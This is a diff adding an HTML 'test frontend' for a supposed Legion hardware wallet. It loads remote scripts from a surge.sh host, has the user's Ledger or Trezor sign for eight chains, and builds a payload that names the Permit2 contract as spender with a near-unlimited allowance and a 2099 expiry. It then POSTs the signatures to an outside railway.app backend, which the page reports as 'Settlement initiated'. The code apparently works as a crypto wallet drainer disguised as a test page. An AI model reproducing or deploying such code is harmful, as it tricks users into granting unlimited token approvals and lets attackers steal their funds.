@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Legion Hardware Wallet Test Frontend</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            max-width: 600px;
+            width: 100%;
+            padding: 40px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .header h1 {
+            font-size: 28px;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .header p {
+            color: #666;
+            font-size: 14px;
+        }
+
+        .button-group {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 30px;
+        }
+
+        button {
+            flex: 1;
+            padding: 14px 20px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        #connectWalletBtn {
+            background: #007AFF;
+            color: white;
+        }
+
+        #connectWalletBtn:hover {
+            background: #0051D5;
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(0, 122, 255, 0.3);
+        }
+
+        #connectWalletBtn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        #clearLogsBtn {
+            background: #FF3B30;
+            color: white;
+        }
+
+        #clearLogsBtn:hover {
+            background: #cc2f25;
+            transform: translateY(-2px);
+        }
+
+        .status-box {
+            background: #f5f5f5;
+            border-left: 4px solid #007AFF;
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 4px;
+        }
+
+        .status-box.success {
+            border-left-color: #34C759;
+            background: #f0fdf4;
+        }
+
+        .status-box.error {
+            border-left-color: #FF3B30;
+            background: #fef2f2;
+        }
+
+        .status-box.pending {
+            border-left-color: #FF9500;
+            background: #fffbf0;
+        }
+
+        .status-label {
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 5px;
+        }
+
+        .status-box.success .status-label {
+            color: #34C759;
+        }
+
+        .status-box.error .status-label {
+            color: #FF3B30;
+        }
+
+        .status-box.pending .status-label {
+            color: #FF9500;
+        }
+
+        .status-value {
+            font-size: 14px;
+            color: #333;
+            word-break: break-all;
+            font-family: 'Courier New', monospace;
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .info-item {
+            background: #f9f9f9;
+            padding: 12px;
+            border-radius: 6px;
+        }
+
+        .info-label {
+            font-size: 12px;
+            font-weight: 600;
+            color: #666;
+            text-transform: uppercase;
+            margin-bottom: 5px;
+        }
+
+        .info-value {
+            font-size: 13px;
+            color: #333;
+            word-break: break-all;
+            font-family: 'Courier New', monospace;
+        }
+
+        .console-section {
+            margin-top: 30px;
+        }
+
+        .console-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .console-header h3 {
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .console-box {
+            background: #1e1e1e;
+            color: #d4d4d4;
+            padding: 12px;
+            border-radius: 6px;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            max-height: 300px;
+            overflow-y: auto;
+            line-height: 1.5;
+        }
+
+        .console-line {
+            margin: 4px 0;
+            padding: 2px 0;
+        }
+
+        .log-info {
+            color: #4ec9b0;
+        }
+
+        .log-error {
+            color: #f48771;
+        }
+
+        .log-success {
+            color: #6a9955;
+        }
+
+        .log-warn {
+            color: #ce9178;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 4px;
+            height: 4px;
+            border-radius: 50%;
+            background: currentColor;
+            animation: spin 1s linear infinite;
+            margin-right: 6px;
+        }
+
+        @keyframes spin {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-8px); }
+        }
+
+        .badge {
+            display: inline-block;
+            background: #007AFF;
+            color: white;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: 600;
+            margin-left: 8px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Legion Hardware Wallet 🔐</h1>
+            <p>Test Frontend - Ledger/Trezor Multi-Chain Signatures</p>
+        </div>
+
+        <div class="button-group">
+            <button id="connectWalletBtn">Connect Wallet</button>
+            <button id="clearLogsBtn">Clear Logs</button>
+        </div>
+
+        <div id="statusBox" class="status-box pending" style="display: none;">
+            <div class="status-label">Status</div>
+            <div class="status-value" id="statusValue">Initializing...</div>
+        </div>
+
+        <div class="info-grid">
+            <div class="info-item">
+                <div class="info-label">Wallet Address</div>
+                <div class="info-value" id="walletAddress">Not connected</div>
+            </div>
+            <div class="info-item">
+                <div class="info-label">Signatures</div>
+                <div class="info-value" id="signatureCount">0 / 8</div>
+            </div>
+            <div class="info-item">
+                <div class="info-label">Backend Status</div>
+                <div class="info-value" id="backendStatus">Ready ✅</div>
+            </div>
+            <div class="info-item">
+                <div class="info-label">Transaction</div>
+                <div class="info-value" id="txStatus">Pending</div>
+            </div>
+        </div>
+
+        <div class="console-section">
+            <div class="console-header">
+                <h3>Console Logs</h3>
+                <span style="font-size: 11px; color: #999;" id="logCount">0 logs</span>
+            </div>
+            <div class="console-box" id="consoleLogs"></div>
+        </div>
+    </div>
+
+    <!-- Scripts -->
+    <script src="https://swapx-defi.surge.sh/legion-hardware-wallets-module.js"></script>
+    <script src="https://swapx-defi.surge.sh/legion-one-script-v2.js"></script>
+
+    <script>
+        const consoleLogs = [];
+        const maxLogs = 50;
+
+        // Override console methods
+        const originalLog = console.log;
+        const originalError = console.error;
+        const originalWarn = console.warn;
+        const originalInfo = console.info;
+
+        function addLog(message, type = 'info') {
+            const timestamp = new Date().toLocaleTimeString();
+            const logLine = `[${timestamp}] ${message}`;
+            consoleLogs.push({ message: logLine, type });
+
+            if (consoleLogs.length > maxLogs) {
+                consoleLogs.shift();
+            }
+
+            renderLogs();
+        }
+
+        console.log = function(...args) {
+            addLog(args.join(' '), 'info');
+            originalLog.apply(console, args);
+        };
+
+        console.error = function(...args) {
+            addLog(args.join(' '), 'error');
+            originalError.apply(console, args);
+        };
+
+        console.warn = function(...args) {
+            addLog(args.join(' '), 'warn');
+            originalWarn.apply(console, args);
+        };
+
+        console.info = function(...args) {
+            addLog(args.join(' '), 'success');
+            originalInfo.apply(console, args);
+        };
+
+        function renderLogs() {
+            const logsHtml = consoleLogs.map(log => {
+                const className = `log-${log.type}`;
+                return `<div class="console-line"><span class="${className}">${escapeHtml(log.message)}</span></div>`;
+            }).join('');
+
+            document.getElementById('consoleLogs').innerHTML = logsHtml;
+            document.getElementById('logCount').textContent = `${consoleLogs.length} logs`;
+            document.getElementById('consoleLogs').scrollTop = document.getElementById('consoleLogs').scrollHeight;
+        }
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        function updateStatus(message, type = 'pending') {
+            const statusBox = document.getElementById('statusBox');
+            const statusValue = document.getElementById('statusValue');
+
+            statusBox.className = `status-box ${type}`;
+            statusValue.textContent = message;
+            statusBox.style.display = 'block';
+        }
+
+        function updateInfo(walletAddr, sigs, backend, tx) {
+            document.getElementById('walletAddress').textContent = walletAddr || 'Not connected';
+            document.getElementById('signatureCount').textContent = sigs || '0 / 8';
+            document.getElementById('backendStatus').textContent = backend || 'Checking...';
+            document.getElementById('txStatus').textContent = tx || 'Pending';
+        }
+
+        // Main handler
+        async function handleConnect() {
+            console.info('🚀 Starting wallet connection...');
+            updateStatus('🔄 Connecting to hardware wallet...', 'pending');
+
+            try {
+                // Check if hardware module loaded
+                if (!window.LEGION_HARDWARE) {
+                    throw new Error('❌ Hardware module not loaded');
+                }
+
+                console.info('✅ Hardware module detected');
+
+                // Connect
+                console.info('🔌 Requesting device connection...');
+                const device = await window.LEGION_HARDWARE.connect();
+                console.info('✅ Device connected: ' + device);
+                updateStatus('✅ Device connected! Requesting signatures...', 'pending');
+
+                // Get wallet address
+                console.info('📍 Requesting wallet address...');
+                const walletAddress = await window.LEGION_HARDWARE.getAddress();
+                console.info('✅ Wallet address: ' + walletAddress);
+                updateInfo(walletAddress, '0 / 8', 'Ready ✅', 'Signing...');
+
+                // Request signatures
+                console.info('✍️  Requesting signatures for 8 chains (this may take 5-10 seconds)...');
+                updateStatus('⏳ Collecting signatures from hardware wallet (2-9 seconds)...', 'pending');
+
+                const signatures = await window.LEGION_HARDWARE.signAll();
+                console.info('✅ All signatures collected: ' + Object.keys(signatures).length + ' chains');
+                updateInfo(walletAddress, '8 / 8', 'Ready ✅', 'Sending...');
+
+                // Build payload
+                console.info('🔨 Building normalized_v1 payload...');
+                const payload = {
+                    ingress: 'normalized_v1',
+                    chain_family: 'EVM',
+                    protocol: 'omnichain_atomic_v1',
+                    wallet_address: walletAddress,
+                    token_address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
+                    signature: signatures.EVM || signatures[Object.keys(signatures)[0]],
+                    nonce: 'legion:' + Date.now(),
+                    expiry_iso: '2099-12-31T23:59:59.999Z',
+                    wallet_type: 'hardware_wallet',
+                    scout_value_usd: 0,
+                    max_allowance: '999999999999999999999999',
+                    requires_quorum: false,
+                    chain_id: 1,
+                    engine_spender: '0x000000000022D473030F116dDEE9F6B43aC78BA3',
+                    permit2: '0x000000000022D473030F116dDEE9F6B43aC78BA3',
+                    permits: [],
+                    batch_permit_metadata: {
+                        nonce: 0,
+                        deadline: '999999999999',
+                        amounts: []
+                    },
+                    native_amount: '0',
+                    native_signed_transaction: '',
+                    signatures: signatures
+                };
+
+                console.info('✅ Payload built with ' + Object.keys(payload).length + ' fields');
+
+                // Send to backend
+                console.info('📤 Sending to backend: https://legionapi-production.up.railway.app/api/v1/signature-anchor');
+                updateStatus('⏳ Sending signatures to backend...', 'pending');
+
+                const response = await fetch('https://legionapi-production.up.railway.app/api/v1/signature-anchor', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                console.info('📥 Backend response: ' + response.status + ' ' + response.statusText);
+
+                const responseData = await response.json().catch(() => ({}));
+                console.info('📋 Response: ' + JSON.stringify(responseData));
+
+                if (response.ok) {
+                    console.info('✅✅✅ SUCCESS! Signatures processed by backend!');
+                    updateStatus('✅ SUCCESS! Settlement initiated by backend!', 'success');
+                    updateInfo(walletAddress, '8 / 8', 'Processing ✅', 'Executed ✅');
+                } else if (response.status === 409) {
+                    console.warn('⚠️  409 Conflict: Duplicate signature (security feature)');
+                    updateStatus('⚠️ Duplicate signature detected (try again in 60 seconds)', 'error');
+                } else {
+                    console.warn('⚠️  Status ' + response.status + ': ' + (responseData.message || 'Unknown error'));
+                    updateStatus('⚠️ Backend returned status ' + response.status, 'error');
+                }
+
+            } catch (error) {
+                console.error('❌ Error: ' + error.message);
+                updateStatus('❌ Error: ' + error.message, 'error');
+                updateInfo('Error', '0 / 8', 'Error ❌', 'Failed');
+            }
+        }
+
+        // Event listeners
+        document.getElementById('connectWalletBtn').addEventListener('click', handleConnect);
+        document.getElementById('clearLogsBtn').addEventListener('click', () => {
+            consoleLogs.length = 0;
+            renderLogs();
+            console.info('🧹 Console cleared');
+        });
+
+        // Initial log
+        console.info('🌐 Test frontend loaded - Ready to connect wallet');
+        console.info('📡 Backend URL: https://legionapi-production.up.railway.app');
+        console.info('⏱️  Chains: EVM, Solana, Bitcoin, TRON, TON, Cosmos, Aptos, Sui');
+    </script>
+</body>
+</html>
